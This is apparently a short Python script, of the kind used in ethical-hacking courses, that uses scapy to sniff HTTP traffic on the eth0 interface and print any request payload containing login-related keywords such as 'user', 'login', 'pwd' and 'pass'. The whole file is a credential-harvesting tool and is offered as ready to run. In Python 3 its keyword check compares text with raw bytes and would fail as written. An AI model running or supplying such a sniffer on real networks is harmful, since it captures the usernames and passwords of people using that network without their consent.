#!/usr/bin/env python

import scapy.all as scapy
import scapy.layers.http as http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
  
  
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["mail", "user", "name", "usr", "login", "pwd", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break
  
  
sniff("eth0")
